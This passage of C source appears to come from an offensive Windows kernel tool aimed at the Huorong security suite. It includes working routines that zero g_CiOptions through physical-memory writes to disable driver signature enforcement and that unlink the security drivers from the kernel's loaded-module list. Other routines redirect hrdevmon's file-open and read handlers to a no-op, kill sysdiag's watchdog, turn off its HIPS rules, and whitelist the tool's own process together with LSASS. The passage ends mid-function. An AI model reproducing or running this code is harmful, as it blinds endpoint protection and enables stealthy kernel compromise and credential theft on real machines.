 *   C7 05 [rel32] 06 00 00 00  (MOV [RIP+rel32], 6  in CiInitialize)
 * Decode RIP-relative address → live VA of g_CiOptions → zero it.
 * Write via AMD physical write (bypasses VBS EPT on AMD bare metal) or
 * sysdiag LOCK XCHG as fallback.  Restored to 0x06 on exit.
 * ══════════════════════════════════════════════════════════════════════ */
static uint64_t g_ci_opts_va   = 0;
static uint64_t g_ci_opts_pa   = 0;
static uint32_t g_ci_opts_orig = 0;

static int ci_find_opts(void)
{
    uint64_t ci_base = 0, ci_sz = 0;
    for (int i = 1; i < g_nmods; i++) {
        if (_stricmp(g_mods[i].name, "ci.dll") == 0) {
            ci_base = g_mods[i].base; ci_sz = g_mods[i].size; break;
        }
    }
    if (!ci_base) { printf("    [CI] ci.dll not in module list\n"); return 0; }
    printf("    [CI] ci.dll base=0x%016llX  sz=0x%llX\n",
           (unsigned long long)ci_base, (unsigned long long)ci_sz);

    char ci_path[MAX_PATH];
    GetSystemDirectoryA(ci_path, sizeof ci_path);
    strncat(ci_path, "\\ci.dll", sizeof ci_path - strlen(ci_path) - 1);
    HANDLE hfci = CreateFileA(ci_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, 0, NULL);
    if (hfci == INVALID_HANDLE_VALUE) {
        printf("    [CI] cannot open %s err=%lu\n", ci_path, GetLastError());
        return 0;
    }
    DWORD ci_dsz = GetFileSize(hfci, NULL);
    uint8_t *ci_pe2 = (uint8_t *)malloc(ci_dsz); DWORD rd_ci = 0;
    ReadFile(hfci, ci_pe2, ci_dsz, &rd_ci, NULL); CloseHandle(hfci);

    IMAGE_DOS_HEADER     *dci  = (IMAGE_DOS_HEADER *)ci_pe2;
    IMAGE_NT_HEADERS64   *nci  = (IMAGE_NT_HEADERS64 *)(ci_pe2 + dci->e_lfanew);
    IMAGE_SECTION_HEADER *sci  = (IMAGE_SECTION_HEADER *)
                                  ((uint8_t*)nci + sizeof(IMAGE_NT_HEADERS64));
    uint16_t nsci = nci->FileHeader.NumberOfSections;

    int found_ci = 0;
    for (int si2 = 0; si2 < nsci && !found_ci; si2++) {
        if (!(sci[si2].Characteristics & 0x20000000)) continue; /* not executable */
        uint32_t fo2  = sci[si2].PointerToRawData;
        uint32_t fsz2 = sci[si2].SizeOfRawData;
        uint32_t rv2  = sci[si2].VirtualAddress;
        if (!fo2 || !fsz2 || fo2 + fsz2 > ci_dsz) continue;
        const uint8_t *code2 = ci_pe2 + fo2;
        for (uint32_t i2 = 0; i2 + 10 <= fsz2; i2++) {
            /* MOV dword ptr [RIP+rel32], 6 */
            if (code2[i2]   != 0xC7) continue;
            if (code2[i2+1] != 0x05) continue;
            if (code2[i2+6] != 0x06) continue;
            if (code2[i2+7] || code2[i2+8] || code2[i2+9]) continue;
            int32_t  rel32   = *(int32_t *)(code2 + i2 + 2);
            /* RIP = ci_base + rv2 + i2 + 10  (section RVA + offset + insn length) */
            uint64_t tgt_va2 = ci_base + rv2 + i2 + 10 + (int64_t)rel32;
            if (tgt_va2 < ci_base || tgt_va2 >= ci_base + ci_sz) continue;
            uint32_t live_ci = 0xDEAD; int got_ci = 0;
            if (sd_open()) got_ci = sd_read_kva(tgt_va2, &live_ci, 4);
            if (!got_ci) {
                uint64_t tpa_ci = va_to_pa(tgt_va2);
                if (tpa_ci) { phys_read(tpa_ci, &live_ci, 4); got_ci = 1; }
            }
            if (!got_ci) continue;
            if (live_ci != 0x06 && live_ci != 0x08 && live_ci != 0x0E) continue;
            g_ci_opts_va   = tgt_va2;
            g_ci_opts_orig = live_ci;
            g_ci_opts_pa   = va_to_pa(tgt_va2);
            if (!g_ci_opts_pa) {
                uint64_t ci_pa_base = find_driver_pa_cached("ci.dll");
                if (ci_pa_base)
                    g_ci_opts_pa = ci_pa_base + (uint32_t)(tgt_va2 - ci_base);
            }
            printf("    [CI] g_CiOptions VA=0x%016llX  PA=0x%016llX  val=0x%02X\n",
                   (unsigned long long)g_ci_opts_va, (unsigned long long)g_ci_opts_pa,
                   g_ci_opts_orig);
            found_ci = 1; break;
        }
    }
    if (!found_ci) printf("    [CI] pattern not found in ci.dll sections\n");
    free(ci_pe2);
    return found_ci;
}

static int ci_opts_disable(void)
{
    if (!g_ci_opts_va && !ci_find_opts()) return 0;
    uint32_t z_ci = 0;
    if (g_ci_opts_pa && pa_in_range(g_ci_opts_pa, 4)) {
        if (phys_write(g_ci_opts_pa, &z_ci, 4)) {
            uint32_t rb_ci = 0; phys_read(g_ci_opts_pa, &rb_ci, 4);
            if (rb_ci == 0) { printf("    [CI] DSE disabled (phys write)\n"); return 1; }
        }
    }
    if (sd_open() && sd_write_kva(g_ci_opts_va, &z_ci, 4)) {
        uint32_t rb_ci2 = 0; sd_read_kva(g_ci_opts_va, &rb_ci2, 4);
        if (rb_ci2 == 0) { printf("    [CI] DSE disabled (sysdiag write)\n"); return 1; }
    }
    printf("    [CI] write FAILED\n"); return 0;
}

static void ci_opts_restore(void)
{
    if (!g_ci_opts_va || !g_ci_opts_orig) return;
    if (g_ci_opts_pa && pa_in_range(g_ci_opts_pa, 4))
        phys_write(g_ci_opts_pa, &g_ci_opts_orig, 4);
    else if (sd_open())
        sd_write_kva(g_ci_opts_va, &g_ci_opts_orig, 4);
    printf("[+] g_CiOptions restored to 0x%02X\n", g_ci_opts_orig);
}

/* ══════════════════════════════════════════════════════════════════════
 * §7f  DKOM DRIVER HIDING — Unlink EDR drivers from PsLoadedModuleList
 *
 * Removes sysdiag.sys / hrdevmon.sys / hrwfpdrv.sys from the kernel's
 * loaded-module list so NtQuerySystemInformation(SystemModuleInformation)
 * and EnumDeviceDrivers() no longer report them.  Drivers remain loaded.
 * InLoadOrderLinks AND InMemoryOrderLinks are both unlinked.
 * Self-referential pointers are written so stale list-walk doesn't crash.
 * All entries are relinked verbatim during restore_all().
 *
 * Uses sd_read_kva / sd_write_kva (LOCK XCHG) — va_to_pa NOT required.
 * ══════════════════════════════════════════════════════════════════════ */
#define DKOM_MAX 16
typedef struct {
    uint64_t va;          /* VA of this entry's InLoadOrderLinks (== LDR entry start) */
    uint64_t fl, bl;      /* InLoadOrderLinks  saved Flink, Blink                     */
    uint64_t mfl, mbl;    /* InMemoryOrderLinks saved Flink, Blink                    */
    char name[64];
    int  unlinked;
} DkomEnt;
static DkomEnt g_dkom[DKOM_MAX];
static int     g_dkom_n = 0;

static const char *DKOM_TARGETS[] = {
    "sysdiag.sys", "hrdevmon.sys", "hrwfpdrv.sys", NULL
};

static int dkom_hide_drivers(void)
{
    if (!g_nt_va || !g_nt_pe || !g_nt_pe_sz) return 0;
    if (!sd_open()) { printf("    [DKOM] sysdiag unavailable\n"); return 0; }
    uint32_t ps_rva_d = pe_export_rva(g_nt_pe, g_nt_pe_sz, "PsLoadedModuleList");
    if (!ps_rva_d) { printf("    [DKOM] PsLoadedModuleList not exported\n"); return 0; }
    uint64_t ps_head = g_nt_va + ps_rva_d;
    printf("    [DKOM] PsLoadedModuleList VA=0x%016llX\n", (unsigned long long)ps_head);

    uint64_t cur_d = 0;
    if (!sd_read_kva(ps_head, &cur_d, 8) || !cur_d || (cur_d>>48)!=0xFFFF) {
        printf("    [DKOM] bad Flink\n"); return 0;
    }
    int hidden = 0;
    for (int iter = 0; iter < 512 && cur_d != ps_head; iter++) {
        /* Read next pointer FIRST before any modification */
        uint64_t nxt_d = 0;
        sd_read_kva(cur_d, &nxt_d, 8);

        uint16_t blen_d = 0; uint64_t bbuf_d = 0;
        sd_read_kva(cur_d + 0x058, &blen_d, 2);
        sd_read_kva(cur_d + 0x060, &bbuf_d, 8);

        if (blen_d && bbuf_d && (bbuf_d>>48)==0xFFFF && blen_d <= 256) {
            uint16_t wname_d[129] = {0};
            uint32_t rlen_d = blen_d < 256 ? blen_d : 256;
            sd_read_kva(bbuf_d, wname_d, rlen_d);
            char aname_d[129] = {0};
            for (int k = 0; k < (int)(rlen_d/2) && k < 128; k++)
                aname_d[k] = (wname_d[k] && wname_d[k] < 0x80) ? (char)wname_d[k] : '?';

            int want_d = 0;
            for (int j = 0; DKOM_TARGETS[j]; j++)
                if (_stricmp(aname_d, DKOM_TARGETS[j]) == 0) { want_d = 1; break; }

            if (want_d && g_dkom_n < DKOM_MAX) {
                DkomEnt *e = &g_dkom[g_dkom_n++];
                e->va = cur_d; e->unlinked = 0;
                memcpy(e->name, aname_d, 63); e->name[63] = '\0';
                sd_read_kva(cur_d,        &e->fl,  8);
                sd_read_kva(cur_d + 0x08, &e->bl,  8);
                sd_read_kva(cur_d + 0x10, &e->mfl, 8);
                sd_read_kva(cur_d + 0x18, &e->mbl, 8);
                /* Unlink InLoadOrderLinks: prev.Flink=next, next.Blink=prev */
                int ok1_d = sd_write_kva(e->bl,        &e->fl,    8);
                int ok2_d = sd_write_kva(e->fl + 0x08, &e->bl,    8);
                /* Self-reference so stale ptr walk doesn't crash */
                sd_write_kva(cur_d,        &cur_d, 8);
                sd_write_kva(cur_d + 0x08, &cur_d, 8);
                /* Unlink InMemoryOrderLinks if both FLink/Blink valid */
                if ((e->mfl>>48)==0xFFFF && (e->mbl>>48)==0xFFFF && e->mfl != e->mbl) {
                    sd_write_kva(e->mbl,        &e->mfl, 8);
                    sd_write_kva(e->mfl + 0x08, &e->mbl, 8);
                    uint64_t msv = cur_d + 0x10;
                    sd_write_kva(cur_d + 0x10, &msv, 8);
                    sd_write_kva(cur_d + 0x18, &msv, 8);
                }
                e->unlinked = (ok1_d && ok2_d);
                printf("    [DKOM] %-22s unlinked (fl=%d bl=%d)\n",
                       aname_d, ok1_d, ok2_d);
                if (e->unlinked) hidden++;
            }
        }
        if (!nxt_d || (nxt_d>>48)!=0xFFFF) break;
        cur_d = nxt_d;
    }
    return hidden;
}

static void dkom_restore(void)
{
    if (!sd_open()) return;
    for (int i = 0; i < g_dkom_n; i++) {
        DkomEnt *e = &g_dkom[i]; if (!e->unlinked) continue;
        /* Relink InLoadOrderLinks */
        sd_write_kva(e->bl,        &e->va,  8); /* prev.Flink = us   */
        sd_write_kva(e->fl + 0x08, &e->va,  8); /* next.Blink = us   */
        sd_write_kva(e->va,        &e->fl,  8); /* our Flink = next  */
        sd_write_kva(e->va + 0x08, &e->bl,  8); /* our Blink = prev  */
        /* Relink InMemoryOrderLinks */
        if ((e->mfl>>48)==0xFFFF && (e->mbl>>48)==0xFFFF && e->mfl != e->mbl) {
            uint64_t mv = e->va + 0x10;
            sd_write_kva(e->mbl,        &mv,    8);
            sd_write_kva(e->mfl + 0x08, &mv,    8);
            sd_write_kva(e->va + 0x10, &e->mfl, 8);
            sd_write_kva(e->va + 0x18, &e->mbl, 8);
        }
        printf("[+] DKOM relinked: %s\n", e->name);
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §7g  hrdevmon IRP HOOK DISABLE
 *
 * hrdevmon.sys registers IRP_MJ_CREATE (idx 0) and IRP_MJ_READ (idx 3)
 * handlers in its _DRIVER_OBJECT.MajorFunction array.  These intercept
 * file open and read IRPs, allowing Huorong HIPS to detect threat files
 * even after sysdiag callbacks are cleared.
 *
 * Method:
 *   1. Scan physical RAM for hrdevmon's _DRIVER_OBJECT:
 *      - Type field (WORD @ +0) == 4
 *      - DriverStart (PVOID @ +0x18) == hrdevmon's loaded base VA
 *   2. Find a safe "nop" dispatch: first MajorFunction entry that points
 *      to ntoskrnl (IopInvalidDeviceRequest or similar system default).
 *   3. Overwrite MajorFunction[0] and [3] with that nop pointer.
 *      hrdevmon IRPs are silently completed without HIPS notification.
 *   4. Restore originals in restore_all().
 *
 * Safety: AMD physical write (UC) + cache eviction.  The nop handler
 * is a real function pointer — not NULL — so the I/O manager never faults.
 * ══════════════════════════════════════════════════════════════════════ */
static uint64_t g_hrdev_drv_pa     = 0;
static uint64_t g_hrdev_mj_orig[2] = {0, 0};
static int      g_hrdev_patched    = 0;

static uint64_t hrdev_find_drv_obj(uint64_t hr_va)
{
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t cpa = g_ranges[ri].base; cpa < re; cpa += CHUNK_SZ) {
            uint64_t csz = re - cpa; if (csz > CHUNK_SZ) csz = CHUNK_SZ;
            if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;
            for (uint64_t off = 0; off + 0x180 <= csz; off += 8) {
                if (*(uint16_t *)(g_chunk + off) != 4) continue; /* Type == 4 */
                uint16_t dsz_h = *(uint16_t *)(g_chunk + off + 2);
                if (dsz_h < 0x140 || dsz_h > 0x250) continue;   /* Size sane */
                uint64_t ds_h = *(uint64_t *)(g_chunk + off + 0x18);
                if (ds_h != hr_va) continue;                     /* DriverStart */
                uint64_t mj0_h = *(uint64_t *)(g_chunk + off + 0x70);
                if ((mj0_h >> 48) != 0xFFFF) continue;           /* MajFn[0] KVA */
                printf("    [HRDEV] DriverObject PA=0x%016llX\n",
                       (unsigned long long)(cpa + off));
                return cpa + off;
            }
        }
    }
    return 0;
}

static int hrdevmon_irp_disable(void)
{
    uint64_t hr_va = 0, hr_sz = 0;
    for (int i = 1; i < g_nmods; i++) {
        if (_stricmp(g_mods[i].name, "hrdevmon.sys") == 0) {
            hr_va = g_mods[i].base; hr_sz = g_mods[i].size; break;
        }
    }
    if (!hr_va) { printf("    [HRDEV] not loaded — skipped\n"); return 0; }

    g_hrdev_drv_pa = hrdev_find_drv_obj(hr_va);
    if (!g_hrdev_drv_pa) { printf("    [HRDEV] DriverObject not found\n"); return 0; }

    uint64_t mj_h[28] = {0};
    if (!phys_read(g_hrdev_drv_pa + 0x70, mj_h, sizeof mj_h)) {
        printf("    [HRDEV] MajorFunction read failed\n"); return 0;
    }

    /* Find safe nop: prefer a pointer inside ntoskrnl (IopInvalidDeviceRequest) */
    uint64_t nop_h = 0;
    uint64_t nt_sz_h = (g_nmods > 0) ? g_mods[0].size : 0x1600000;
    /* Pass 1: look for ntoskrnl entries (skip CREATE/CLOSE/READ/WRITE at 0,2,3,4) */
    for (int k = 1; k < 28 && !nop_h; k++) {
        if (k==2||k==3||k==4) continue;
        if (!mj_h[k]) continue;
        if (mj_h[k] >= g_nt_va && mj_h[k] < g_nt_va + nt_sz_h) nop_h = mj_h[k];
    }
    /* Pass 2: any valid KVA outside hrdevmon range */
    for (int k = 1; k < 28 && !nop_h; k++) {
        if (k==2||k==3||k==4) continue;
        if (!mj_h[k]) continue;
        if ((mj_h[k]>>48)==0xFFFF && (mj_h[k] < hr_va || mj_h[k] >= hr_va+hr_sz))
            nop_h = mj_h[k];
    }
    if (!nop_h) { printf("    [HRDEV] no safe nop handler found\n"); return 0; }
    printf("    [HRDEV] nop=0x%016llX\n", (unsigned long long)nop_h);

    g_hrdev_mj_orig[0] = mj_h[0]; /* IRP_MJ_CREATE */
    g_hrdev_mj_orig[1] = mj_h[3]; /* IRP_MJ_READ   */

    int ok1_h = phys_write(g_hrdev_drv_pa + 0x70 + 0*8, &nop_h, 8);
    int ok2_h = phys_write(g_hrdev_drv_pa + 0x70 + 3*8, &nop_h, 8);
    if (ok1_h || ok2_h) {
        g_hrdev_patched = 1;
        cache_evict_all_cores();
        printf("    [HRDEV] MajorFunction[CREATE=%d, READ=%d] → nop (ok=%d,%d)\n",
               0, 3, ok1_h, ok2_h);
        return ok1_h + ok2_h;
    }
    printf("    [HRDEV] phys_write FAILED\n"); return 0;
}

static void hrdevmon_irp_restore(void)
{
    if (!g_hrdev_patched || !g_hrdev_drv_pa) return;
    phys_write(g_hrdev_drv_pa + 0x70 + 0*8, &g_hrdev_mj_orig[0], 8);
    phys_write(g_hrdev_drv_pa + 0x70 + 3*8, &g_hrdev_mj_orig[1], 8);
    cache_evict_all_cores();
    printf("[+] hrdevmon MajorFunction restored\n");
}

/* ══════════════════════════════════════════════════════════════════════
 * §7b  SYSDIAG WATCHDOG DISABLE (KDPC redirect)
 * ══════════════════════════════════════════════════════════════════════
 * sysdiag.sys has a timer-based KDPC that:
 *   1. Calls PsLookupProcessByProcessId(4 → LSASS pid)
 *   2. Reads EPROCESS+0x884 and restores it to 0x41 if changed
 *   3. Also monitors FLT callback lists and OB entries → KeBugCheckEx on tamper
 * Strategy: scan physical RAM for KDPC structures (Type=0x13/0x1A) whose
 * DeferredRoutine VA falls inside sysdiag's loaded image range, then redirect
 * the routine pointer to a harmless 'C3' (RET) stub in ntoskrnl.
 * KDPC/KTIMER are non-paged pool data — not HVCI-protected code pages.
 * After redirect, the timer still fires but the DPC immediately returns. */
/* Disable sysdiag.sys (Huorong main HIPS engine) via known data-section global
 * variables confirmed by IDA analysis in HUORONG_ANALYSIS.md §7 + §9.
 *
 * ALL writes target sysdiag's .data section (non-paged pool, NOT HVCI-protected
 * code pages) → zero BSOD risk from integrity check or HVCI.
 *
 * Three independent bypass layers:
 *   (A) byte_14013BDD8 = 1         → watchdog thread PsTerminateSystemThread(0)
 *       byte_140076F00 = 0         → watchdog active flag cleared
 *   (B) dword_140077D88 &= ~2      → HIPS master enable bit cleared
 *                                     sub_140048E90 returns 0 for ALL rules
 *                                     → FLT/OB/CM callbacks all pass-through
 *   (C) qword_1400FE090[0..1] = {our_pid, lsass_pid}
 *                                  → process exclusion whitelist
 *                                     sub_140017780() returns true → OB skip
 *
 * sysdiag image base in IDA = 0x140000000; all RVAs below are from that base.
 * Actual VA = sysdiag_loaded_base + RVA. */
/* Scan sysdiag.sys PE image in physical memory for the watchdog kill-switch byte.
 * Returns the RVA (image-base-relative) of the kill-switch BYTE in the data section,
 * or 0 if not found.  The watchdog loop reads this byte; when != 0 the loop exits.
 *
 * Patterns searched (x64 MSVC/GCC output for "while (!g_flag)"):
 *   80 3D xx xx xx xx 00  75/74 yy      CMP byte [rip+X],0 ; JNZ/JZ rel8
 *   80 3D xx xx xx xx 00  0F 85/84 ...  CMP byte [rip+X],0 ; JNZ/JZ rel32
 *   F6 05 xx xx xx xx FF  75/74 yy      TEST byte [rip+X],FF ; JNZ/JZ rel8
 *   8A 05 xx xx xx xx  84 C0  75/74     MOV AL,[rip+X] ; TEST AL,AL ; JNZ/JZ
 *   0F B6 05 xx xx xx xx  85 C0  75/74  MOVZX EAX,[rip+X] ; TEST EAX,EAX ; JNZ/JZ
 * Uses va_to_pa() per page so the scan works even when driver image is non-contiguous in PA.
 * Target must fall inside a writable, non-executable section. */
static uint32_t sd_find_ksw_rva(uint64_t sd_pa)
{
    uint8_t hdr[0x1000]={0};
    if(!phys_read(sd_pa,hdr,sizeof hdr)) return 0;
    if(*(uint16_t*)hdr != 0x5A4D) return 0;           /* MZ */
    uint32_t lfanew=*(uint32_t*)(hdr+0x3C);
    if(lfanew+0x108u > sizeof hdr) return 0;
    uint8_t *nt=hdr+lfanew;
    if(*(uint32_t*)nt != 0x00004550) return 0;        /* PE */
    uint16_t nsec=*(uint16_t*)(nt+6);
    uint16_t optsz=*(uint16_t*)(nt+20);
    uint8_t *sec=nt+24+optsz;
    if(sec+nsec*40u > hdr+sizeof hdr || nsec>64) return 0;

    /* collect text ranges and writable-data ranges */
    typedef struct{ uint32_t rva,sz; } Range;
    Range text[8]; int ntext=0;
    Range data[8]; int ndata=0;
    for(int i=0;i<nsec&&i<64;i++){
        uint8_t *s=sec+i*40;
        uint32_t vrva=*(uint32_t*)(s+12);
        uint32_t vvsz=*(uint32_t*)(s+8);  /* VirtualSize — covers BSS for data range */
        uint32_t vsz =*(uint32_t*)(s+16); /* SizeOfRawData — scan limit for code sections */
        uint32_t chr =*(uint32_t*)(s+36);
        int exec =(chr>>5)&1;        /* IMAGE_SCN_CNT_CODE or EXECUTE */
        int write=(chr>>31)&1;       /* IMAGE_SCN_MEM_WRITE */
        if((chr&0x20)||(chr&0x20000000)) exec=1;
        if(chr&0x80000000) write=1;
        if(exec && ntext<8){ text[ntext].rva=vrva; text[ntext++].sz=vsz; }
        if(!exec && write && ndata<8){ data[ndata].rva=vrva; data[ndata++].sz=vvsz; }
    }
    if(!ntext||!ndata) return 0;

    /* rva-in-writable-data check — macro param named _rv_ to avoid shadowing struct member 'rva' */
    #define IN_DATA(_rv_) ({ \
        int _found=0; \
        for(int _di=0;_di<ndata&&!_found;_di++) \
            if((_rv_)>=data[_di].rva && (_rv_)<data[_di].rva+data[_di].sz) _found=1; \
        _found; })

#define SCAN_BUFSZ (0x1000)   /* one page at a time — each page translated via va_to_pa */
    uint8_t *buf=(uint8_t*)malloc(SCAN_BUFSZ);
    if(!buf) return 0;

    uint32_t cands[64]; int ncands=0;

    for(int ti=0;ti<ntext&&ncands<64;ti++){
        uint32_t off=0;
        while(off<text[ti].sz && ncands<64){
            uint32_t rdsz=SCAN_BUFSZ;
            if(rdsz>text[ti].sz-off) rdsz=text[ti].sz-off;
            /* Use va_to_pa for each page so non-contiguous PA layout is handled. */
            uint64_t page_va = g_sd_base ? (g_sd_base + text[ti].rva + off) : 0;
            uint64_t page_pa = page_va ? va_to_pa(page_va) : (sd_pa + text[ti].rva + off);
            if(!page_pa){ off+=rdsz; continue; }
            if(!phys_read(page_pa,buf,rdsz)){ off+=rdsz; continue; }
            for(uint32_t j=0;j+9<=rdsz&&ncands<64;j++){
                /* RVA of this instruction within the image */
                uint32_t instr_rva=text[ti].rva+off+j;
                int32_t  rel32=0;
                uint32_t tgt=0;
                /* Pattern A: 80 3D xx xx xx xx 00  [75|74|0F 85|0F 84] */
                if(buf[j]==0x80 && buf[j+1]==0x3D && buf[j+6]==0x00){
                    rel32=*(int32_t*)(buf+j+2);
                    tgt=(uint32_t)((int32_t)(instr_rva+7)+rel32);
                    if(IN_DATA(tgt)){
                        uint8_t nxt=buf[j+7];
                        if(nxt==0x75||nxt==0x74||
                           (nxt==0x0F&&j+8<rdsz&&(buf[j+8]==0x85||buf[j+8]==0x84))){
                            cands[ncands++]=tgt;
                        }
                    }
                }
                /* Pattern B: F6 05 xx xx xx xx FF  [75|74] */
                if(buf[j]==0xF6 && buf[j+1]==0x05 && buf[j+6]==0xFF){
                    rel32=*(int32_t*)(buf+j+2);
                    tgt=(uint32_t)((int32_t)(instr_rva+7)+rel32);
                    if(IN_DATA(tgt)){
                        uint8_t nxt=buf[j+7];
                        if(nxt==0x75||nxt==0x74) cands[ncands++]=tgt;
                    }
                }
                /* Pattern C: 8A 05 xx xx xx xx  84 C0  [75|74|0F85|0F84]
                 * MOV AL,[RIP+disp32] + TEST AL,AL + Jcc */
                if(j+9<=rdsz && buf[j]==0x8A && buf[j+1]==0x05){
                    rel32=*(int32_t*)(buf+j+2);
                    tgt=(uint32_t)((int32_t)(instr_rva+6)+rel32);
                    if(IN_DATA(tgt) && buf[j+6]==0x84 && buf[j+7]==0xC0){
                        uint8_t nxt=buf[j+8];
                        if(nxt==0x75||nxt==0x74||
                           (nxt==0x0F&&j+9<rdsz&&(buf[j+9]==0x85||buf[j+9]==0x84)))
                            cands[ncands++]=tgt;
                    }
                }
                /* Pattern D: 0F B6 05 xx xx xx xx  85 C0  [75|74]
                 * MOVZX EAX,BYTE PTR [RIP+disp32] + TEST EAX,EAX + Jcc */
                if(j+10<=rdsz && buf[j]==0x0F && buf[j+1]==0xB6 && buf[j+2]==0x05){
                    rel32=*(int32_t*)(buf+j+3);
                    tgt=(uint32_t)((int32_t)(instr_rva+7)+rel32);
                    if(IN_DATA(tgt) && buf[j+7]==0x85 && buf[j+8]==0xC0){
                        uint8_t nxt=buf[j+9];
                        if(nxt==0x75||nxt==0x74) cands[ncands++]=tgt;
                    }
                }
            }
            off += rdsz; /* page-granular — no cross-page overlap needed */
        }
    }
    free(buf);
    #undef IN_DATA
    #undef SCAN_BUFSZ

    if(!ncands){ printf("  [ksw_scan] no candidates found\n"); return 0; }

    /* Deduplicate */
    uint32_t unique[64]; int nu=0;
    for(int i=0;i<ncands;i++){
        int dup=0; for(int k=0;k<nu;k++) if(unique[k]==cands[i]){dup=1;break;}
        if(!dup) unique[nu++]=cands[i];
    }

    printf("  [ksw_scan] %d candidate(s) in data section:\n",nu);
    for(int i=0;i<nu;i++)
        printf("    [%d] RVA=0x%08X (0x13BDD8 delta=%+d)\n",i,unique[i],
               (int)unique[i]-(int)0x13BDD8);

    /* Return candidate closest to the known-good RVA 0x13BDD8 from prior IDA analysis.
     * On the same sysdiag family, the kill-switch is usually within ±0x8000. */
    uint32_t best=unique[0];
    uint32_t best_d=(unique[0]>0x13BDD8)?unique[0]-0x13BDD8:0x13BDD8-unique[0];
    for(int i=1;i<nu;i++){
        uint32_t d=(unique[i]>0x13BDD8)?unique[i]-0x13BDD8:0x13BDD8-unique[i];
        if(d<best_d){best_d=d;best=unique[i];}
    }
    return best;
}

static int kill_sysdiag_watchdog(void)
{
    /* Find sysdiag loaded base VA */
    uint64_t sd_base=0;
    for(int i=1;i<g_nmods;i++){
        char tmp[64]; strncpy(tmp,g_mods[i].name,63); tmp[63]='\0';
        for(int k=0;tmp[k];k++) tmp[k]=(char)tolower((unsigned char)tmp[k]);
        if(strstr(tmp,"sysdiag")){
            sd_base=g_mods[i].base;
            printf("  sysdiag @ 0x%llX  size=0x%X\n",
                   (unsigned long long)sd_base,(unsigned)g_mods[i].size);
            break;
        }
    }
    if(!sd_base){ printf("  sysdiag not found in module list\n"); return 0; }
    /* save for OB VA-range matching in ob_apply_edr */
    for(int i=1;i<g_nmods;i++)
        if(g_mods[i].base==sd_base){ g_sd_base=sd_base; g_sd_size=(uint32_t)g_mods[i].size; break; }

    /* Print sysdiag module path for IDA host copy (uses NtQSI ModuleInfo) */
    {
        ULONG sz=0; NtQuerySystemInformation(11,NULL,0,&sz); sz+=4096;
        void *buf=malloc(sz);
        if(buf && NT_SUCCESS(NtQuerySystemInformation(11,buf,sz,NULL))){
            uint32_t cnt=*(uint32_t*)buf;
            uint8_t *p=(uint8_t*)buf+4;
            for(uint32_t i=0;i<cnt;i++,p+=284){
                char *nm=(char*)(p+24); /* ImageName offset in SYSTEM_MODULE_INFORMATION */
                char lo[64]; strncpy(lo,nm,63); lo[63]='\0';
                for(int k=0;lo[k];k++) lo[k]=(char)tolower((unsigned char)lo[k]);
                if(strstr(lo,"sysdiag")){
                    printf("  sysdiag path: %s\n",nm);
                    break;
                }
            }
        }
        if(buf) free(buf);
    }

    printf("  Locating sysdiag PA via modpath scan...\n");
    uint64_t sd_pa = find_driver_pa_by_modpath("sysdiag.sys");
    if(!sd_pa){ printf("  [!] sysdiag PA not found\n"); return 0; }
    printf("  sysdiag PA=0x%016llX\n",(unsigned long long)sd_pa);

    int ok=0;

    /* (A) Kill switch: scan sysdiag PE code section for the watchdog loop guard.
     * RVA 0x13BDD8 was correct for the analyzed version; different builds shift it.
     * sd_find_ksw_rva() scans for CMP/TEST-JNZ patterns in .text that reference .data. */
    {
        printf("  [ksw_scan] scanning sysdiag code for kill-switch RVA...\n");
        uint32_t ksw_rva = sd_find_ksw_rva(sd_pa);
        if(!ksw_rva){
            /* Primary fallback: 0x13B940 (confirmed via disk-binary pattern scan).
             * Also write 0x13BDD8 (prior analyzed version) as belt-and-suspenders. */
            printf("  [ksw_scan] scan failed — using confirmed RVA 0x13B940\n");
            ksw_rva = 0x13B940;
            /* secondary belt-and-suspenders write to the analyzed-version RVA */
            uint64_t pa2 = sd_pa + 0x13BDD8;
            uint8_t v2=1; phys_write(pa2,&v2,1);
        } else {
            printf("  [ksw_scan] found RVA 0x%08X\n", ksw_rva);
            /* Always also write to the confirmed-good RVA 0x13BDD8 (verified via
             * disasm: watchdog thread at sub_140042380 checks exactly this address
             * at two places — RVA 0x423A2 and 0x423DE).  The scan may find a
             * different BSS variable that is NOT the loop guard. */
            if(ksw_rva != 0x13BDD8){
                uint64_t pa_confirmed = sd_pa + 0x13BDD8;
                uint8_t vc=1;
                if(phys_write(pa_confirmed,&vc,1)){
                    uint8_t rbc=0; phys_read(pa_confirmed,&rbc,1);
                    printf("  [A+] confirmed kill_switch @ RVA=0x13BDD8 readback=%u\n",rbc);
                } else printf("  [!] write 0x13BDD8 FAIL\n");
            }
        }
        uint64_t pa = sd_pa + ksw_rva;
        uint8_t v=1;
        if(phys_write(pa,&v,1)){
            cache_evict_all_cores();
            uint8_t rb=0; phys_read(pa,&rb,1);
            printf("  [A] kill_switch @ RVA=0x%08X  readback=%u%s\n",
                   ksw_rva, rb, rb==1?"":" ← STALE");
            ok++;
        } else printf("  [!] write kill_switch FAIL (PA=0x%llX)\n",(unsigned long long)pa);
    }

    /* (B) HIPS master disable: dword_140077D88 &= ~2
     * This is the MASTER bypass gate in sub_140048E90: if bit1==0, ALL rules
     * return no-block immediately, regardless of watchdog state. */
    { uint64_t pa=sd_pa+0x77D88;
      uint32_t val=0; phys_read(pa,&val,4);
      uint32_t nv=val&~2u;
      if(phys_write(pa,&nv,4)){
          printf("  [B] dword_140077D88 0x%08X->0x%08X  (HIPS master off)\n",val,nv); ok++; }
      else printf("  [!] write dword_140077D88 FAIL (PA=0x%llX)\n",(unsigned long long)pa);
    }

    /* (C) PID whitelist: qword_1400FE090[0]=us, [1]=LSASS */
    { uint64_t pa=sd_pa+0xFE090;
      uint64_t our=(uint64_t)GetCurrentProcessId();
      if(phys_write(pa,&our,8)){
          printf("  [C] whitelist[0]=%llu (us)\n",(unsigned long long)our); ok++; }
      if(g_lsass_pid){ uint64_t lp=(uint64_t)g_lsass_pid;
          if(phys_write(pa+8,&lp,8))
              printf("  [C] whitelist[1]=%u (LSASS)\n",g_lsass_pid); }
    }

    if(ok>0){
        /* Wait for watchdog to exit. The watchdog checks byte_14013BDD8 at the TOP
         * of its loop, after returning from KeWaitForSingleObject.
         * Strategy: spawn/kill a dummy process each 50ms to trigger kernel process
         * events that wake the watchdog — it will loop back, see kill switch=1, exit.
         * Poll for up to 500ms. */
        printf("  [*] Triggering watchdog wakeup (process noise, 2s window)...\n");
